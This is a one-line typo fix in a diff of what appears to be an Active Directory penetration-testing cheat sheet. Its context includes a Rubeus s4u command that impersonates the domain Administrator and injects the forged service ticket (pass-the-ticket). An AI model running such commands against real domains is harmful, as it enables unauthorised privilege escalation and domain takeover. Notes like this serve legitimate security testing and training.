@@ -311,7 +311,7 @@ asktgs with previous tgt and impersonate domain admin:
 ```
 .\Rubeus.exe s4u /domain:<domain> /impersonateuser:Administrator /msdsspn:"<service>" /ticket:<TGT> /ptt
 ```
-ps: then same can be done with impacket script
+ps: the same can be done with impacket script
 --------------------------------------------------------------
 
 # Check LIST
